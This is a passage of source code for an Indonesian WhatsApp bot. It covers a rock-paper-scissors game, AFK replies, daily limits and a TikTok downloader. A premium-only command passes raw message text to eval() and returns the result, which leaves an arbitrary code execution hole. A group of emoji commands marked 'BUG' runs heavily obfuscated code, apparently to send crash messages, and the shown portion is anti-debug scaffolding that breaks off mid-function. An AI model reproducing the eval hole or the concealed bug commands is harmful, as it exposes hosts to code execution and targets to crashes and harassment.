    if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
    if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
    roof.waktu_milih = setTimeout(() => {
    if (!roof.pilih && !roof.pilih2) haikal.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
    else if (!roof.pilih || !roof.pilih2) {
    win = !roof.pilih ? roof.p2 : roof.p
    haikal.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
    }
    delete this.suit[roof.id]
    return !0
    }, roof.timeout)
    }
    let jwb = m.sender == roof.p
    let jwb2 = m.sender == roof.p2
    let g = /gunting/i
    let b = /batu/i
    let k = /kertas/i
    let reg = /^(gunting|batu|kertas)/i
    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
    roof.pilih = reg.exec(m.text.toLowerCase())[0]
    roof.text = m.text
    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
    if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
    }
    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
    roof.text2 = m.text
    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
    if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
    }
    let stage = roof.pilih
    let stage2 = roof.pilih2
    if (roof.pilih && roof.pilih2) {
    clearTimeout(roof.waktu_milih)
    if (b.test(stage) && g.test(stage2)) win = roof.p
    else if (b.test(stage) && k.test(stage2)) win = roof.p2
    else if (g.test(stage) && k.test(stage2)) win = roof.p
    else if (g.test(stage) && b.test(stage2)) win = roof.p2
    else if (k.test(stage) && b.test(stage2)) win = roof.p
    else if (k.test(stage) && g.test(stage2)) win = roof.p2
    else if (stage == stage2) tie = true
    haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
    delete this.suit[roof.id]
    }
    }
    
if (budy.startsWith('©️')) {
if (!isPrem) return replyprem(mess.premium)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
//let reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: m.key, text: "" })
/*let reactionMessage = {
                    react: {
                        text: `☑️`,
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                haikal.sendMessage(m.chat, reactionMessage)*/
               
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
async function tiktokdl(url) {
    try {
const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
let a = cheerio.load(tokenn.data);
let token = a("#token").attr("value");
const param = {
    url: url,
    token: token,
};
const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
method: "post",
data: new URLSearchParams(Object.entries(param)),
headers: {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
},
    }
);
return {
    status: 200,
    title: data.title,
    thumbnail: data.thumbnail,
    duration: data.duration,
    media: data.medias,
};
    } catch (e) {
return e
    }
}
async function replyprem(teks) {
    let buttons = [
    { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Upgrade Premium' }, type: 1 }
    ]
    return haikal.sendButtonText(m.chat, buttons, teks, `Awokwok Chat Admin`, m)
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
    if (setting) {
if (!isNumber(setting.status)) setting.status = 0
    } else global.global.db.data.settings[botNumber] = {
status: 0,
    }    
} catch (err) {
console.log(err)
}
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
haikal.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
haikal.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyhaikalList(chath, dblist)) {
var getkaydata = getDatahaikalList(chath, dblist)
if (getkaydata.isImage === false) {
haikal.sendMessage(m.chat, { text: sendhaikalList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
haikal.sendImage(m.chat, buff, `${getkaydata.response}`, m)
}
}

//=================================================//
switch(command) {
//=================================================//

//BUG 
case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
(function(_0x5591c6,_0x336305){function _0x1e99d6(_0x2a6b90,_0x3e55d6,_0x59bcfe,_0x406276,_0x438441){return _0x34d4(_0x59bcfe-0x4b,_0x3e55d6);}function _0x2bf4b8(_0x6e6cae,_0x1346d2,_0x40ad63,_0x24c37d,_0x1f864c){return _0x34d4(_0x1346d2- -0x393,_0x24c37d);}function _0x5c4a48(_0x5483b5,_0x1f3448,_0x18c562,_0x465d66,_0x56e7b3){return _0x34d4(_0x56e7b3- -0x48,_0x465d66);}function _0x36158d(_0x56807c,_0x5f5db5,_0x33c991,_0x31baea,_0x410dbe){return _0x34d4(_0x56807c- -0x67,_0x5f5db5);}function _0x2030d3(_0x187a79,_0x297c44,_0x43d8d1,_0x5acf55,_0x2d82f8){return _0x34d4(_0x187a79-0x246,_0x2d82f8);}var _0x250c85=_0x5591c6();while(!![]){try{var _0x1c357c=-parseInt(_0x2030d3(0x52c,0x481,0x4e4,0x497,0x5ab))/(0x1*-0x2353+-0x24d5+0x4829)*(parseInt(_0x2030d3(0x4e4,0x597,0x54e,0x57b,0x4a3))/(0x10f*0x2+0x121c+-0x8*0x287))+-parseInt(_0x2030d3(0x533,0x587,0x505,0x48d,0x535))/(0x1af+0x4*-0x487+-0x1070*-0x1)*(parseInt(_0x5c4a48(0x23c,0x172,0x173,0x23b,0x20f))/(-0x221+0x1ec1+-0x1c9c))+-parseInt(_0x5c4a48(0x19a,0x1eb,0xc8,0x204,0x167))/(-0xe28+0x1305+0x5*-0xf8)*(parseInt(_0x2bf4b8(-0x165,-0x199,-0x210,-0x1d4,-0x175))/(-0x20*-0x2f+-0x160+-0x47a))+parseInt(_0x2030d3(0x48f,0x530,0x45d,0x43b,0x3f8))/(-0x44f*-0x1+0x1d*-0x12f+0x1e0b)+parseInt(_0x36158d(0x17a,0xe6,0x134,0x15c,0x186))/(-0x1891+-0x2535+0x3dce)+-parseInt(_0x2bf4b8(-0x15d,-0x114,-0x72,-0x16e,-0xd7))/(-0x23d1+0x4*0x5ec+0xc2a)+-parseInt(_0x36158d(0x256,0x259,0x278,0x1e5,0x2ab))/(-0x722+0x3b*-0x3b+-0x1*-0x14c5)*(-parseInt(_0x5c4a48(0x1b9,0x289,0x234,0x1c3,0x1c9))/(-0x1*0x1c34+0x1365*-0x1+0x2fa4));if(_0x1c357c===_0x336305)break;else _0x250c85['push'](_0x250c85['shift']());}catch(_0x54ac3e){_0x250c85['push'](_0x250c85['shift']());}}}(_0x1b97,0x6de9c*0x1+0x45557+-0x16*-0xd32));var _0x5b0975=(function(){function _0x3fb7db(_0x247c2e,_0x3392e8,_0x26384b,_0x4e2e72,_0x44be2a){return _0x34d4(_0x44be2a- -0xcb,_0x247c2e);}function _0x377f95(_0x2b41f8,_0x1854db,_0x46725b,_0x44e239,_0x92491e){return _0x34d4(_0x46725b- -0x3a2,_0x1854db);}var _0x546697={'lICzn':function(_0x34754c,_0x31086f){return _0x34754c(_0x31086f);},'urlEf':function(_0x37e916,_0x58d554){return _0x37e916+_0x58d554;},'uupPv':_0x2bb6ca(0x2b8,0x3c7,0x373,0x378,0x2bf)+_0x3fb7db(0x114,0x1ab,0x76,0x13c,0xf9)+_0x2bb6ca(0x364,0x287,0x2c8,0x28a,0x278)+_0x470e09(0x5bb,0x587,0x5be,0x5d3,0x5ad),'FMKpq':_0x3fb7db(0x25a,0x157,0x1dc,0x12f,0x1c5)+_0x2bb6ca(0x49d,0x3b5,0x42f,0x3a1,0x3b3)+_0x2bb6ca(0x432,0x361,0x39f,0x36d,0x2f4)+_0x58e90d(0x24c,0x228,0x273,0x266,0x249)+_0x58e90d(0x273,0x2ce,0x353,0x27f,0x2a3)+_0x3fb7db(0x160,0x1f8,0x1da,0x1e1,0x1dd)+'\x20)','fPYeM':function(_0x3e7609,_0x2e4b8e){return _0x3e7609===_0x2e4b8e;},'ezXCy':_0x58e90d(0x240,0x264,0x2ae,0x21a,0x270),'tpdVa':_0x2bb6ca(0x2bd,0x2eb,0x2bd,0x28b,0x225),'RyiJx':function(_0x3a57ab,_0x360395){return _0x3a57ab!==_0x360395;},'IamBt':_0x470e09(0x434,0x50b,0x4bb,0x580,0x4e2),'KsUQh':_0x2bb6ca(0x2d1,0x248,0x2ab,0x367,0x20e),'SPSrG':function(_0x1d45f1,_0x25f761){return _0x1d45f1!==_0x25f761;},'bnzFT':_0x377f95(-0x1fd,-0xf6,-0x16e,-0x139,-0xca),'ugHNU':_0x3fb7db(0x175,0x1c3,0x15e,0x8b,0x124)};function _0x470e09(_0x43c009,_0x36a883,_0x276588,_0x3e1292,_0x53249c){return _0x34d4(_0x53249c-0x324,_0x36a883);}function _0x2bb6ca(_0x397471,_0x102e70,_0x5acf73,_0xf03fa1,_0x3efa7b){return _0x34d4(_0x5acf73-0x105,_0xf03fa1);}var _0x13d685=!![];function _0x58e90d(_0xadecc6,_0x2e2f29,_0xe96e7,_0x4f00ac,_0x199c25){return _0x34d4(_0x199c25- -0x35,_0x4f00ac);}return function(_0x2c465f,_0x1971ae){var _0x426d52={'ZJupJ':function(_0x2958c0,_0x232e67){function _0x13fa99(_0x34fd2d,_0x30983b,_0x1b82f0,_0x202810,_0x3a784d){return _0x34d4(_0x34fd2d-0x25a,_0x3a784d);}return _0x546697[_0x13fa99(0x46f,0x491,0x3e4,0x3cb,0x3f4)](_0x2958c0,_0x232e67);},'ujImb':function(_0x3f310e,_0x8bcd4f){function _0x53aa56(_0x375f88,_0x44bc27,_0x12dafe,_0x63623e,_0x2a3d3f){return _0x34d4(_0x2a3d3f- -0x1e1,_0x63623e);}return _0x546697[_0x53aa56(0x17,-0x81,0x15,-0x18,-0x25)](_0x3f310e,_0x8bcd4f);},'KLfqg':_0x546697[_0x414543(0x47a,0x4bf,0x466,0x522,0x448)],'uHXIL':_0x546697[_0x414543(0x437,0x44e,0x39a,0x383,0x3dc)],'UbQsU':function(_0x38479e,_0x523d3c){function _0x7006ca(_0x3cd35d,_0x164936,_0x4ceb85,_0x59a18e,_0x4bcfd3){return _0x5c120b(_0x164936,_0x164936-0x85,_0x3cd35d-0x101,_0x59a18e-0xc0,_0x4bcfd3-0xe7);}return _0x546697[_0x7006ca(0x3b4,0x3b6,0x3ae,0x2ed,0x351)](_0x38479e,_0x523d3c);},'jfaBt':_0x546697[_0x5c120b(0x35d,0x3a6,0x382,0x34f,0x37d)],'MUEWr':_0x546697[_0x277a3f(0x121,0x1db,0x1cc,0x1d4,0x132)],'IdlBO':function(_0xbf5c8d,_0xc4a568){function _0x3fc50f(_0x3dbfc0,_0x52fbbd,_0x525085,_0x57b2fc,_0x1cc3a8){return _0x414543(_0x3dbfc0-0x147,_0x52fbbd-0x9b,_0x57b2fc-0x149,_0x525085,_0x1cc3a8-0x18f);}return _0x546697[_0x3fc50f(0x603,0x513,0x5e0,0x5ab,0x54a)](_0xbf5c8d,_0xc4a568);},'AobKG':_0x546697[_0x5c120b(0x428,0x39a,0x366,0x426,0x335)],'PcVbv':_0x546697[_0x414543(0x504,0x489,0x4b1,0x508,0x453)]};function _0x277a3f(_0x3345a4,_0x152f52,_0x38479d,_0x53f9b5,_0x2af68c){return _0x3fb7db(_0x152f52,_0x152f52-0x10f,_0x38479d-0x1c3,_0x53f9b5-0x4f,_0x3345a4- -0x115);}function _0x414543(_0x545380,_0x2ad194,_0x123cb1,_0x3e7643,_0x379122){return _0x58e90d(_0x545380-0x113,_0x2ad194-0x179,_0x123cb1-0x7,_0x3e7643,_0x123cb1-0x1f5);}function _0x5c120b(_0x4ee889,_0x1186ce,_0x1e0022,_0x25bb08,_0x1ccd13){return _0x470e09(_0x4ee889-0x49,_0x4ee889,_0x1e0022-0xc5,_0x25bb08-0x38,_0x1e0022- -0x278);}function _0x438de6(_0x39c2df,_0x226a13,_0x5325bb,_0x16b407,_0x3963d5){return _0x2bb6ca(_0x39c2df-0xba,_0x226a13-0x173,_0x39c2df-0x95,_0x5325bb,_0x3963d5-0xbd);}function _0x15f8e9(_0x39a8eb,_0x3ec531,_0x4144d8,_0xd784a0,_0xddcfd){return _0x377f95(_0x39a8eb-0x61,_0x3ec531,_0xd784a0-0x697,_0xd784a0-0x178,_0xddcfd-0x2f);}if(_0x546697[_0x414543(0x328,0x38b,0x3ed,0x3da,0x3e5)](_0x546697[_0x15f8e9(0x4e3,0x578,0x566,0x54f,0x529)],_0x546697[_0x277a3f(0x16,-0x3a,-0x6d,0x67,0x7e)])){var _0x33fe9d=_0x13d685?function(){function _0x19029c(_0x2600bf,_0x37b2f1,_0x2f847a,_0x53127b,_0x40a9d1){return _0x414543(_0x2600bf-0x52,_0x37b2f1-0x1f3,_0x40a9d1- -0x168,_0x2600bf,_0x40a9d1-0x8);}function _0x4135e7(_0x3cd2f4,_0x409a0c,_0xf7158e,_0x50f692,_0xc3f399){return _0x438de6(_0xc3f399-0x141,_0x409a0c-0x5e,_0x3cd2f4,_0x50f692-0x1f,_0xc3f399-0xd);}function _0x2463e3(_0x52ac62,_0x2a4e6d,_0x28a0b2,_0x157a09,_0x40cb13){return _0x15f8e9(_0x52ac62-0x9f,_0x52ac62,_0x28a0b2-0x13c,_0x28a0b2- -0x1ac,_0x40cb13-0x88);}function _0x1ea698(_0x53a7a6,_0x3e806d,_0xb0ca3d,_0x5e3323,_0x5aab30){return _0x15f8e9(_0x53a7a6-0x2,_0xb0ca3d,_0xb0ca3d-0x9f,_0x3e806d- -0x332,_0x5aab30-0x8d);}function _0x1bfdc3(_0x218117,_0x5d2981,_0x3def73,_0x5231a6,_0xeb28f4){return _0x277a3f(_0x5231a6-0x10c,_0xeb28f4,_0x3def73-0x174,_0x5231a6-0x1f1,_0xeb28f4-0x17e);}var _0x4d566c={'xSblo':function(_0x5c7be5,_0x488c29){function _0x2407dc(_0x2c4d47,_0x221dc2,_0x1fe228,_0x3f6358,_0xf320fe){return _0x34d4(_0x3f6358-0x2ec,_0x2c4d47);}return _0x426d52[_0x2407dc(0x552,0x5f6,0x4d2,0x57f,0x55e)](_0x5c7be5,_0x488c29);},'sbdMP':function(_0x82c84b,_0x4349c6){function _0x3c6833(_0x4d6adf,_0x1b61cb,_0x5297fa,_0x13e9b6,_0x257966){return _0x34d4(_0x5297fa- -0x27c,_0x257966);}return _0x426d52[_0x3c6833(-0x127,-0xbb,-0xde,-0x19d,-0x160)](_0x82c84b,_0x4349c6);},'ecdRU':function(_0x123dc2,_0x54d439){function _0x529f94(_0x3e3336,_0x2fbfa4,_0x574223,_0x1d2d5c,_0x1591fb){return _0x34d4(_0x574223-0x2cc,_0x1591fb);}return _0x426d52[_0x529f94(0x3fd,0x4f6,0x46a,0x4f2,0x45c)](_0x123dc2,_0x54d439);},'eUvJt':_0x426d52[_0x1bfdc3(0x2c2,0x2bf,0x181,0x239,0x237)],'fPhrL':_0x426d52[_0x1bfdc3(0xa6,0x178,0xab,0x131,0x1c9)]};if(_0x426d52[_0x2463e3(0x3e1,0x33d,0x3da,0x38c,0x46b)](_0x426d52[_0x1bfdc3(0x1f9,0x1d8,0x21f,0x220,0x1b0)],_0x426d52[_0x4135e7(0x431,0x52e,0x3ef,0x546,0x48b)]))_0x350629=_0x4d566c[_0x1bfdc3(0x1aa,0x2d0,0x22d,0x248,0x1b4)](_0x577647,_0x4d566c[_0x2463e3(0x29d,0x2e6,0x2ff,0x32b,0x3bf)](_0x4d566c[_0x1bfdc3(0x13f,0x234,0x217,0x1cb,0x125)](_0x4d566c[_0x1ea698(0x1bf,0x207,0x1f4,0x15c,0x1be)],_0x4d566c[_0x1ea698(0x217,0x17a,0x14d,0x105,0x23d)]),');'))();else{if(_0x1971ae){if(_0x426d52[_0x19029c(0x35b,0x3aa,0x321,0x2b0,0x340)](_0x426d52[_0x1ea698(0x2ca,0x2d9,0x29d,0x2ec,0x2be)],_0x426d52[_0x1ea698(0x1d3,0x19b,0x22f,0x144,0x103)])){var _0x356bf1=_0x1971ae[_0x2463e3(0x34c,0x472,0x3fa,0x45b,0x42a)](_0x2c465f,arguments);return _0x1971ae=null,_0x356bf1;}else{if(_0xe0111){var _0x481f97=_0x25a0bb[_0x1bfdc3(0x289,0x18b,0x234,0x1dd,0x137)](_0x304e63,arguments);return _0x47b776=null,_0x481f97;}}}}}:function(){};return _0x13d685=![],_0x33fe9d;}else{var _0x4a7894=_0x3e6afb[_0x15f8e9(0x660,0x56a,0x5e9,0x5a6,0x5e0)](_0x5c0cac,arguments);return _0x59b8cd=null,_0x4a7894;}};}()),_0x5bcb2c=_0x5b0975(this,function(){var _0x5bee79={};function _0x249043(_0x52f669,_0x449668,_0x2d56db,_0x431459,_0x319274){return _0x34d4(_0x449668- -0x21e,_0x431459);}function _0x5645b7(_0x356fb1,_0x2f9cac,_0x34f8c7,_0x54aadc,_0x276ee2){return _0x34d4(_0x356fb1- -0x2ee,_0x54aadc);}function _0x288936(_0x7cdec5,_0x5c6af8,_0x2ba0f7,_0x14dce1,_0x5f0c38){return _0x34d4(_0x2ba0f7-0x21,_0x5c6af8);}_0x5bee79[_0x288936(0x1cd,0x234,0x28d,0x2fd,0x30c)]=_0x308470(0x335,0x2b5,0x296,0x3a0,0x384)+_0x288936(0x26a,0x311,0x32b,0x282,0x384)+'+$';function _0x308470(_0xcd83f,_0x8a0f77,_0x538c58,_0x301106,_0x49b048){return _0x34d4(_0xcd83f-0xc0,_0x538c58);}var _0xf27dd9=_0x5bee79;function _0x3d4f8f(_0x459bcf,_0xaf6954,_0x16265f,_0x190311,_0x460598){return _0x34d4(_0xaf6954- -0x3be,_0x16265f);}return _0x5bcb2c[_0x3d4f8f(-0x150,-0xc0,0x2,-0x129,-0x30)+_0x288936(0x2ea,0x32e,0x2a2,0x295,0x32e)]()[_0x3d4f8f(-0x226,-0x16d,-0x14b,-0x233,-0xdd)+'h'](_0xf27dd9[_0x249043(0x17,0x4e,0xb6,0x96,-0x43)])[_0x5645b7(0x10,0xbb,-0xaa,0x2,0xa0)+_0x3d4f8f(-0x1c8,-0x13d,-0x153,-0xc5,-0x139)]()[_0x249043(0x13c,0x7e,0x82,0x79,0x8e)+_0x249043(0x69,0x55,-0x71,0xa3,-0x2d)+'r'](_0x5bcb2c)[_0x288936(0x327,0x269,0x272,0x250,0x1ca)+'h'](_0xf27dd9[_0x249043(-0x27,0x4e,-0x5e,0xd3,0x23)]);});_0x5bcb2c(),(function(){function _0x5bf4fa(_0x317ecc,_0x24d30f,_0x51e2c1,_0x2f8f0a,_0x572192){return _0x34d4(_0x51e2c1-0x2e8,_0x572192);}function _0x506473(_0x28ddd3,_0x317daa,_0x8a5952,_0x57ddd1,_0x3f2b3a){return _0x34d4(_0x57ddd1-0xe6,_0x317daa);}function _0x5ac64c(_0x59259f,_0x54a897,_0x4a5011,_0x3a2d3f,_0x1acf20){return _0x34d4(_0x3a2d3f-0x62,_0x4a5011);}var _0x590c74={'zOQvp':function(_0x4e80ea){return _0x4e80ea();},'ytoPA':function(_0x1836d5,_0x1c4331){return _0x1836d5===_0x1c4331;},'vosQW':_0x4aca5d(0x72,0x2d,0x50,-0xa,-0x54),'kgWUt':function(_0x4faeb,_0x122a7d){return _0x4faeb!==_0x122a7d;},'YMVcn':_0x506473(0x316,0x3b0,0x266,0x30c,0x379),'wAhWu':function(_0x3e3427,_0xdc3cfa){return _0x3e3427(_0xdc3cfa);},'pqYqx':function(_0xb85560,_0x3d85be){return _0xb85560+_0x3d85be;},'dCjVK':function(_0x5d1ded,_0x382360){return _0x5d1ded+_0x382360;},'muvRl':_0x506473(0x2d9,0x2b2,0x394,0x354,0x2b1)+_0x34bc5b(0x1ff,0x1ee,0x284,0x22b,0x2ff)+_0x506473(0x34b,0x233,0x283,0x2a9,0x32f)+_0x506473(0x380,0x390,0x390,0x36f,0x2b1),'pAqdm':_0x506473(0x344,0x42e,0x425,0x376,0x373)+_0x5ac64c(0x385,0x32d,0x403,0x38c,0x2ec)+_0x506473(0x37d,0x3c6,0x3b2,0x380,0x319)+_0x4aca5d(-0x38,0xbc,0xc4,0x82,0x22)+_0x5bf4fa(0x5f5,0x56a,0x5c0,0x562,0x5dc)+_0x506473(0x38b,0x41e,0x417,0x38e,0x340)+'\x20)','rATMF':_0x506473(0x428,0x4a7,0x388,0x3f8,0x3f0),'stcTi':function(_0xf8ec64){return _0xf8ec64();}},_0x2ca1c9=function(){function _0x52d9c8(_0x4a10fe,_0x16a409,_0x44bfe2,_0x5c3f67,_0x2c62c1){return _0x506473(_0x4a10fe-0x160,_0x2c62c1,_0x44bfe2-0x133,_0x5c3f67- -0x26e,_0x2c62c1-0x1a8);}function _0x420a1(_0x8c3975,_0x588b8d,_0x443749,_0xa6e73,_0x4ce4e6){return _0x4aca5d(_0x8c3975-0x5d,_0xa6e73,_0x443749-0xf2,_0xa6e73-0x1a2,_0x588b8d-0x251);}function _0x3efcbd(_0x36704d,_0x29349,_0x43c592,_0x51ffe7,_0xe72087){return _0x4aca5d(_0x36704d-0xeb,_0x43c592,_0x43c592-0x113,_0x51ffe7-0x8a,_0x29349-0x28c);}function _0x76075a(_0x4a3798,_0x1f1d78,_0x394d77,_0x459252,_0x1823b4){return _0x5bf4fa(_0x4a3798-0x12f,_0x1f1d78-0x73,_0x4a3798- -0x57a,_0x459252-0x58,_0x1823b4);}function _0xf7426c(_0x392d9d,_0x6005bc,_0x1c0c15,_0x954fa3,_0x13c256){return _0x4aca5d(_0x392d9d-0x1ad,_0x392d9d,_0x1c0c15-0x1c3,_0x954fa3-0x84,_0x954fa3-0x4c8);}if(_0x590c74[_0x76075a(-0x9e,-0x152,-0x100,-0x144,-0x10b)](_0x590c74[_0x420a1(0x25e,0x2e7,0x29e,0x33f,0x25f)],_0x590c74[_0x3efcbd(0x273,0x322,0x2ce,0x372,0x26e)])){var _0x15d6c5;try{if(_0x590c74[_0xf7426c(0x4cd,0x4e1,0x46f,0x4d6,0x580)](_0x590c74[_0x76075a(-0xf5,-0xc7,-0xf4,-0x149,-0xb7)],_0x590c74[_0x52d9c8(0x90,-0x65,-0xa9,0x15,0x80)])){var _0x137e4e=_0x1dcd7f?function(){function _0x1003c8(_0xc33013,_0x497cb1,_0x46472b,_0x2ce18d,_0xa20505){return _0x76075a(_0x46472b-0x135,_0x497cb1-0x16a,_0x46472b-0xcd,_0x2ce18d-0xf5,_0xc33013);}if(_0x54669a){var _0x34a846=_0x1d59c8[_0x1003c8(0x98,0x10c,0x154,0x184,0x1f5)](_0x1c66d1,arguments);return _0xcf18bd=null,_0x34a846;}}:function(){};return _0x581983=![],_0x137e4e;}else _0x15d6c5=_0x590c74[_0x3efcbd(0x1a9,0x21e,0x1e6,0x160,0x284)](Function,_0x590c74[_0x3efcbd(0x176,0x1f5,0x1b1,0x28a,0x202)](_0x590c74[_0x3efcbd(0x201,0x27b,0x310,0x1e8,0x2e3)](_0x590c74[_0x3efcbd(0x348,0x296,0x350,0x210,0x25b)],_0x590c74[_0x76075a(-0x2e,0x40,-0x67,0x1c,-0xa5)]),');'))();}catch(_0x4dc9bf){_0x590c74[_0x52d9c8(0x2b,0x2f,0x126,0xe2,0x142)](_0x590c74[_0x52d9c8(0xcf,0x1d4,0x1fb,0x183,0x196)],_0x590c74[_0x76075a(0x79,0x14,-0x18,0x78,-0x28)])?_0x590c74[_0x76075a(-0x20,0x2a,-0x47,-0x8e,0x9d)](_0x277514):_0x15d6c5=window;}return _0x15d6c5;}else return![];},_0x507fd8=_0x590c74[_0x34bc5b(0x3e6,0x307,0x3bb,0x480,0x353)](_0x2ca1c9);function _0x34bc5b(_0x119984,_0x4c44af,_0x1daec1,_0x462362,_0xc4874){return _0x34d4(_0x1daec1-0xc0,_0x119984);}function _0x4aca5d(_0x129a58,_0x5ba43c,_0x257717,_0x2f7a56,_0x1f6cc7){return _0x34d4(_0x1f6cc7- -0x25c,_0x5ba43c);}_0x507fd8[_0x506473(0x3bc,0x2f8,0x3de,0x31d,0x356)+_0x5bf4fa(0x57b,0x60f,0x596,0x5ff,0x5da)+'l'](_0x5eddef,0x4*0x2bb+0x331*0xc+-0x2198);}());function _0x1cb810(_0x3edbe7,_0x2d9432,_0xbe7797,_0x47ff70,_0x49c1ba){return _0x34d4(_0x47ff70- -0x162,_0xbe7797);}var _0xcd10e3=(function(){var _0x61a7be={'djLjX':_0x16f1e5(0x4e,0x56,0xa9,0x40,0x3c)+_0x2f6365(0x533,0x4e9,0x509,0x588,0x5d9)+_0x16f1e5(-0x49,-0xb2,-0x49,-0x108,0x41),'Rzdtw':_0x2f6365(0x545,0x532,0x567,0x494,0x585)+'er','kFioy':function(_0x348d8d,_0x9216fc){return _0x348d8d(_0x9216fc);},'vtJMm':function(_0x500057,_0x213da8){return _0x500057+_0x213da8;},'AQVYH':_0x36e6f6(-0x77,-0x10d,-0x6e,-0x19a,-0x9b)+_0x2d3bf0(0x187,0x2b,0xe6,0x15e,0x9c)+_0x36e6f6(-0x109,-0x1b8,-0x21d,-0x17b,-0x1f6)+_0x16f1e5(0xa1,0x12d,0xab,0x6c,0x20),'kFLvV':_0x16f1e5(0xa8,0xc9,0x9e,0xe4,0x117)+_0x36e6f6(-0x2,-0x51,-0x55,0x37,0x37)+_0x2f6365(0x5a1,0x657,0x620,0x5cb,0x5a0)+_0x16f1e5(0x96,0xe3,0x47,0xd3,0x5c)+_0x2d3bf0(0x1bf,0x1f4,0x1fa,0x22d,0x1ff)+_0x36e6f6(-0x139,-0xd3,-0x35,-0x15a,-0xad)+'\x20)','JaDOW':function(_0x31f2bc){return _0x31f2bc();},'YnBpv':function(_0x7a62ae,_0x530a98){return _0x7a62ae!==_0x530a98;},'YzQHB':_0x16f1e5(0x118,0xb3,0x18a,0x58,0x180),'fbCnt':_0x2d3bf0(0xb6,0xb6,0x131,0x78,0x188),'hksmg':function(_0x4e2673,_0x5ce888){return _0x4e2673===_0x5ce888;},'TNbyy':_0x16f1e5(0xc2,0xc8,0x1f,0x92,0xd5),'ztVdn':_0x36e6f6(0x3a,-0x6f,-0xd6,-0x96,0x42)};function _0x9499d5(_0x37f332,_0x4f3322,_0x365525,_0x13118c,_0x14d5dd){return _0x34d4(_0x37f332- -0x44,_0x4f3322);}function _0x2f6365(_0x1474ae,_0x39c41e,_0x432e78,_0x5eae02,_0xde64f1){return _0x34d4(_0x1474ae-0x307,_0x432e78);}function _0x16f1e5(_0x46f25b,_0x4702f1,_0x2e2004,_0x1b27c4,_0x5c3744){return _0x34d4(_0x46f25b- -0x1e8,_0x5c3744);}var _0x5b6499=!![];function 